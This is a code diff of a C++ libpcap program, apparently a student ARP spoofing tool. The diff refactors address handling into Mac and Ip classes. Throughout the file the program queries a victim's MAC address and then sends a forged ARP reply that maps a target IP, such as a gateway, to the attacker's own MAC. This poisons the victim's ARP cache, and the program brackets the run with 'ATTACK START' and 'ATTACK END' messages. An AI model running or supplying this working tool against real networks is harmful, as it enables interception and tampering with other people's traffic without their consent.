@@ -5,7 +5,10 @@
 #include <stdlib.h>
 #include "ethhdr.h"
 #include "arphdr.h"
-#include "getmymac.h"
+#include "getmyaddr.h"
+
+#define req 0
+#define rep 1
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -36,59 +39,33 @@ bool parse(Param* param, int argc, char* argv[]) {
 	return true;
 }
 
-void convertToStr(u_int8_t addr[], char* str, int div)
+void makeArpPacket(EthArpPacket* packet, Mac eth_dmac, Mac eth_smac, Mac arp_tmac, Mac arp_smac, Ip arp_sip, Ip arp_tip, int flag)
 {
-    char bit8[4] = {'\0'};
-	if(div == 4)
-	{
-		for(int i = 0;i<4;i++)
-		{
-			sprintf(bit8, "%d", addr[i]);
-			strcat(str, bit8);
-			if(i != 3)
-				strcat(str, ".");
-		}
-	}
-	else
-	{
-		for(int i = 0;i<6;i++)
-		{
-			sprintf(bit8, "%02x", addr[i]);
-			strcat(str, bit8);
-			if(i != 5)
-				strcat(str, ":");
-		}
-	}
-}
-
-void makeArpPacket(EthArpPacket* packet, char* eth_dmac, char* eth_smac, char* arp_tmac, char* arp_smac, char* arp_sip, char* arp_tip, int flag)
-{
-	packet->eth_.dmac_ = Mac(eth_dmac); //Mac("2c:8d:b1:e9:43:7d");
-	packet->eth_.smac_ = Mac(eth_smac); //Mac("00:0c:29:4d:48:57");
+	packet->eth_.dmac_ = eth_dmac; //Mac("2c:8d:b1:e9:43:7d");
+	packet->eth_.smac_ = eth_smac; //Mac("00:0c:29:4d:48:57");
 	packet->eth_.type_ = htons(EthHdr::Arp);
 	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
 	packet->arp_.pro_ = htons(EthHdr::Ip4);
 	packet->arp_.hln_ = Mac::SIZE;
 	packet->arp_.pln_ = Ip::SIZE;
-	if(flag == 1)
+	if(flag == rep)
 		packet->arp_.op_ = htons(ArpHdr::Reply); 
 	else
 		packet->arp_.op_ = htons(ArpHdr::Request); 
-	packet->arp_.smac_ = Mac(arp_smac); //Mac("00:0c:29:4d:48:57"); //refer
-	packet->arp_.sip_ = htonl(Ip(arp_sip)); //htonl(Ip("192.168.1.1")); //refer
-	packet->arp_.tmac_ = Mac(arp_tmac); //Mac("2c:8d:b1:e9:43:7d");
-	packet->arp_.tip_ = htonl(Ip(arp_tip)); //htonl(Ip("192.168.1.4"));
+	packet->arp_.smac_ = arp_smac; //Mac("00:0c:29:4d:48:57"); //refer
+	packet->arp_.sip_ = htonl(arp_sip); //htonl(Ip("192.168.1.1")); //refer
+	packet->arp_.tmac_ = arp_tmac; //Mac("2c:8d:b1:e9:43:7d");
+	packet->arp_.tip_ = htonl(arp_tip); //htonl(Ip("192.168.1.4"));
 }
 
-int getotherMac(pcap_t* inhandle, char* otherMac, char* tarip)
+Mac getotherMac(pcap_t* inhandle, Ip tarip)
 {
-	EthArpPacket p;
 	u_int16_t* ethtype = NULL;
 	u_int16_t* arppro = NULL;
-	u_int8_t tip_x[4] = {0};
+	u_int32_t tip_x;
 	u_int8_t mac_x[6] = {0x00};
-	char mac_c[18] = {'\0'};
-	char tip_c[16] = {'\0'};
+	Ip tip;
+	Mac mac;
 	while (true) {
 		struct pcap_pkthdr* header;
 		const u_char* packet;
@@ -102,33 +79,28 @@ int getotherMac(pcap_t* inhandle, char* otherMac, char* tarip)
 		arppro = (u_int16_t*)(packet+16);
         if(ntohs(*ethtype) == 0x0806 && ntohs(*arppro) == 0x0800)
 		{
-			tip_x[0] = *(packet+28); tip_x[1] = *(packet+29);
-			tip_x[2] = *(packet+30); tip_x[3] = *(packet+31);
-			convertToStr(tip_x, tip_c, 4);
-			if(strcmp(tip_c, tarip) == 0)
+			memcpy(&tip_x, packet+28, Ip::SIZE);
+			tip = Ip(ntohl(tip_x));
+			if(tarip == tip)
 			{
 				mac_x[0] = *(packet+6); mac_x[1] = *(packet+7); mac_x[2] = *(packet+8);
 				mac_x[3] = *(packet+9); mac_x[4] = *(packet+10); mac_x[5] = *(packet+11); 
-				convertToStr(mac_x, mac_c, 6);
+				mac = mac_x;
 				break;
 			}
 		}
-		tip_c[0] = '\0';
 	}
-	strcpy(otherMac, mac_c);
-	return 1;
+	return mac;
 }
 
 int main(int argc, char* argv[]) {
 	if (!parse(&param, argc, argv))
 		return -1;
-	
-	char vic_mac[18] = {'\0'};
-	char my_mac[18] = {'\0'};
-	char my_ip[16] = {'\0'};
 
+	uint8_t my_mac[6] = {0x00};
 	getMacAddress(my_mac, argv[1]); //get my mac address
-	getIPAddress(my_ip, argv[1]); //get my ip address
+	Mac mac_mine = my_mac;
+	Ip my_ip = getIPAddress(argv[1]);
 
 	char errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t* outhandle = pcap_open_live(param.dev_, 0, 0, 0, errbuf);
@@ -141,25 +113,33 @@ int main(int argc, char* argv[]) {
 		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
 		return -1;
 	}
+
 	EthArpPacket packet;
+	Mac broadcast = Mac("ff:ff:ff:ff:ff:ff");
+	Mac forsendermac = Mac("00:00:00:00:00:00");
+
+	Mac sender_mac;
+	Ip sender_ip;
+	Ip target_ip;
 	printf("=====ATTACK START=====\n");
 	for(int i = 2;i<argc;i+=2)
 	{
-		makeArpPacket(&packet, "ff:ff:ff:ff:ff:ff", my_mac, "00:00:00:00:00:00", my_mac, my_ip, argv[i], 0);
+		sender_ip = Ip(argv[i]);
+		makeArpPacket(&packet, broadcast, my_mac, forsendermac, my_mac, my_ip, sender_ip, req);
 		int res = pcap_sendpacket(outhandle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(outhandle));
 		}
-		getotherMac(inhandle, vic_mac, argv[i]); //problem
-		makeArpPacket(&packet, vic_mac, my_mac, vic_mac, my_mac, argv[i+1], argv[i], 1);
+		sender_mac = getotherMac(inhandle, sender_ip); //problem
+		target_ip = Ip(argv[i+1]);
+		makeArpPacket(&packet, sender_mac, my_mac, sender_mac, my_mac, target_ip, sender_ip, rep);
 		res = pcap_sendpacket(outhandle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
 		if (res != 0) {
 			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(outhandle));
 		}
-		vic_mac[0] = '\0';
 	}
-
 	printf("======ATTACK END======\n");
+
 	pcap_close(outhandle);
 	pcap_close(inhandle);
 }
